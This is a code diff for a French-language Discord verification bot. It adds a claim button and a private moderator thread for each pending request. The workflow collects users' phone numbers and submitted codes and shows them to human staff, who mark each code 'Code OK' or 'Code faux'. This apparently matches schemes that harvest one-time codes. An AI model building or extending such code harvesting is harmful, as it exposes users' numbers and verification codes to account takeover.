@@ -65,31 +65,33 @@ function buildModEmbed(user, originGuild, phone, code, dateStr) {
     .setColor(0x2b2d31);
 }
 
+function buildClaimEmbed(user, originGuild, memberPresent, memberCount, dateStr, claimedBy) {
+  const presence = memberPresent ? "🟢 présent" : "❌ A quitté le serveur";
+  const claimLine = claimedBy ? `<@${claimedBy}>` : "@_";
+  return new EmbedBuilder()
+    .setTitle(`${user.username}`)
+    .setDescription(`<@${user.id}> · \`${user.id}\`\n${originGuild.name}\n\n${presence} · ${memberCount} membres\n\n**Soumis** · ${dateStr}\n\nClaim par ${claimLine}`)
+    .setThumbnail(user.displayAvatarURL())
+    .setColor(0x2b2d31);
+}
+
 async function sendToMods(originInteraction, phone) {
   const user = originInteraction.user;
   const originGuild = originInteraction.guild;
   const key = `${originGuild.id}:${user.id}`;
   const now = new Date();
   const dateStr = now.toLocaleString("fr-FR", { day: "2-digit", month: "long", year: "numeric", hour: "2-digit", minute: "2-digit" });
-  const embed = buildModEmbed(user, originGuild, phone, null, dateStr);
-  const row1 = new ActionRowBuilder().addComponents(
-    new ButtonBuilder().setCustomId(`mod_validate_${originGuild.id}_${user.id}`).setLabel("Valider l'accès").setStyle(ButtonStyle.Success).setEmoji("✅"),
-    new ButtonBuilder().setCustomId(`mod_resend_${originGuild.id}_${user.id}`).setLabel("Renvoyer").setStyle(ButtonStyle.Secondary).setEmoji("🔄"),
-    new ButtonBuilder().setCustomId(`mod_msg_${originGuild.id}_${user.id}`).setLabel("Message").setStyle(ButtonStyle.Secondary).setEmoji("💬"),
-    new ButtonBuilder().setCustomId(`mod_reject_${originGuild.id}_${user.id}`).setLabel("Rejeter").setStyle(ButtonStyle.Danger).setEmoji("❌")
-  );
-  const row2 = new ActionRowBuilder().addComponents(
-    new StringSelectMenuBuilder().setCustomId(`mod_staff_${originGuild.id}_${user.id}`).setPlaceholder("⚙️ Actions staff...").addOptions(
-      { label: "Réinitialiser", description: "Supprime la tentative — le membre peut recommencer", value: "reset", emoji: "🔄" },
-      { label: "Blacklister le numéro", description: "Numéro interdit définitivement", value: "blacklist_num", emoji: "🔴" },
-      { label: "Blacklister l'utilisateur", description: "Bloque ce compte Discord", value: "blacklist_user", emoji: "⛔" },
-      { label: "Expulser", description: "Expulse le membre", value: "kick", emoji: "👢" },
-      { label: "Bannir", description: "Bannit le membre", value: "ban", emoji: "🔨" }
-    )
+  let present = true;
+  try {
+    await originGuild.members.fetch(user.id);
+  } catch { present = false; }
+  const embed = buildClaimEmbed(user, originGuild, present, originGuild.memberCount || 0, dateStr, null);
+  const row = new ActionRowBuilder().addComponents(
+    new ButtonBuilder().setCustomId(`claim_${originGuild.id}_${user.id}`).setLabel("Claim").setStyle(ButtonStyle.Secondary)
   );
   const modChannel = await getModChannel();
-  const sent = await modChannel.send({ embeds: [embed], components: [row1, row2] });
-  pending.set(key, { phone, code: null, originGuildId: originGuild.id, userId: user.id, date: now, dateStr, modChannelId: modChannel.id, modMessageId: sent.id });
+  const sent = await modChannel.send({ embeds: [embed], components: [row] });
+  pending.set(key, { phone, code: null, originGuildId: originGuild.id, userId: user.id, date: now, dateStr, modChannelId: modChannel.id, modMessageId: sent.id, claimedBy: null, threadId: null, detailMessageId: null });
 }
 
 let readyDone = false;
@@ -204,11 +206,16 @@ client.on("interactionCreate", async (i) => {
     pending.set(key, data);
     await i.reply({ content: "Code reçu. En attente de validation finale.", flags: MessageFlags.Ephemeral });
     try {
-      const modChannel = await client.channels.fetch(data.modChannelId);
-      const modMsg = await modChannel.messages.fetch(data.modMessageId);
+      const targetChannelId = data.threadId || data.modChannelId;
+      const targetChannel = await client.channels.fetch(targetChannelId);
       const og = await client.guilds.fetch(originGuildId).catch(() => null);
-      const newEmbed = buildModEmbed(i.user, og || { name: "Serveur", memberCount: 0, id: originGuildId }, data.phone, code, data.dateStr);
-      await modMsg.edit({ embeds: [newEmbed] });
+      if (data.threadId && data.detailMessageId) {
+        try {
+          const detailMsg = await targetChannel.messages.fetch(data.detailMessageId);
+          const newEmbed = buildModEmbed(i.user, og || { name: "Serveur", memberCount: 0, id: originGuildId }, data.phone, code, data.dateStr);
+          await detailMsg.edit({ embeds: [newEmbed] });
+        } catch {}
+      }
       const operator = getOperator(data.phone);
       const formatted = formatPhone(data.phone);
       const logEmbed = new EmbedBuilder()
@@ -221,13 +228,70 @@ client.on("interactionCreate", async (i) => {
         )
         .setFooter({ text: data.dateStr })
         .setColor(0x57f287);
-      await modChannel.send({ embeds: [logEmbed], components: [new ActionRowBuilder().addComponents(
+      await targetChannel.send({ embeds: [logEmbed], components: [new ActionRowBuilder().addComponents(
         new ButtonBuilder().setCustomId(`code_ok_${originGuildId}_${userId}`).setLabel("Code OK").setStyle(ButtonStyle.Success).setEmoji("✅"),
         new ButtonBuilder().setCustomId(`code_bad_${originGuildId}_${userId}`).setLabel("Code faux").setStyle(ButtonStyle.Danger).setEmoji("❌")
       )] });
       console.log(`envoi modo code ${userId}`);
     } catch (e) {
       console.error("forward code fail:", e);
+    }
+    return;
+  }
+  if (i.isButton() && i.customId.startsWith("claim_")) {
+    const [, originGuildId, userId] = i.customId.split("_");
+    const key = `${originGuildId}:${userId}`;
+    const data = pending.get(key);
+    if (!data) {
+      await i.reply({ content: "Demande expirée.", flags: MessageFlags.Ephemeral });
+      return;
+    }
+    if (data.claimedBy && data.claimedBy !== i.user.id) {
+      await i.reply({ content: `Déjà claim par <@${data.claimedBy}>.`, flags: MessageFlags.Ephemeral });
+      return;
+    }
+    data.claimedBy = i.user.id;
+    pending.set(key, data);
+    try {
+      const modChannel = await client.channels.fetch(data.modChannelId);
+      const modMsg = await modChannel.messages.fetch(data.modMessageId);
+      const og = await client.guilds.fetch(originGuildId).catch(() => null);
+      let present = true;
+      try { if (og) await og.members.fetch(userId); } catch { present = false; }
+      const claimedEmbed = buildClaimEmbed(await client.users.fetch(userId), og || { name: "Serveur", memberCount: 0 }, present, og ? og.memberCount || 0 : 0, data.dateStr, i.user.id);
+      await modMsg.edit({ embeds: [claimedEmbed] });
+      let thread = null;
+      try {
+        thread = await modMsg.startThread({ name: `verif-${userId}`, autoArchiveDuration: 60, type: ChannelType.PrivateThread, reason: `Claim ${i.user.tag}` });
+      } catch {
+        thread = await modMsg.startThread({ name: `verif-${userId}`, autoArchiveDuration: 60 });
+      }
+      try { await thread.members.add(i.user.id); } catch {}
+      const targetUser = await client.users.fetch(userId);
+      const detailEmbed = buildModEmbed(targetUser, og || { name: "Serveur", memberCount: 0, id: originGuildId }, data.phone, data.code, data.dateStr);
+      const row1 = new ActionRowBuilder().addComponents(
+        new ButtonBuilder().setCustomId(`mod_validate_${originGuildId}_${userId}`).setLabel("Valider l'accès").setStyle(ButtonStyle.Success).setEmoji("✅"),
+        new ButtonBuilder().setCustomId(`mod_resend_${originGuildId}_${userId}`).setLabel("Renvoyer").setStyle(ButtonStyle.Secondary).setEmoji("🔄"),
+        new ButtonBuilder().setCustomId(`mod_msg_${originGuildId}_${userId}`).setLabel("Message").setStyle(ButtonStyle.Secondary).setEmoji("💬"),
+        new ButtonBuilder().setCustomId(`mod_reject_${originGuildId}_${userId}`).setLabel("Rejeter").setStyle(ButtonStyle.Danger).setEmoji("❌")
+      );
+      const row2 = new ActionRowBuilder().addComponents(
+        new StringSelectMenuBuilder().setCustomId(`mod_staff_${originGuildId}_${userId}`).setPlaceholder("⚙️ Actions staff...").addOptions(
+          { label: "Réinitialiser", description: "Supprime la tentative — le membre peut recommencer", value: "reset", emoji: "🔄" },
+          { label: "Blacklister le numéro", description: "Numéro interdit définitivement", value: "blacklist_num", emoji: "🔴" },
+          { label: "Blacklister l'utilisateur", description: "Bloque ce compte Discord", value: "blacklist_user", emoji: "⛔" },
+          { label: "Expulser", description: "Expulse le membre", value: "kick", emoji: "👢" },
+          { label: "Bannir", description: "Bannit le membre", value: "ban", emoji: "🔨" }
+        )
+      );
+      const detailMsg = await thread.send({ embeds: [detailEmbed], components: [row1, row2] });
+      data.threadId = thread.id;
+      data.detailMessageId = detailMsg.id;
+      pending.set(key, data);
+      await i.reply({ content: `Thread privé créé : ${thread}`, flags: MessageFlags.Ephemeral });
+    } catch (e) {
+      console.error("claim fail:", e);
+      await i.reply({ content: `Erreur claim: ${e.message}`, flags: MessageFlags.Ephemeral });
     }
     return;
   }
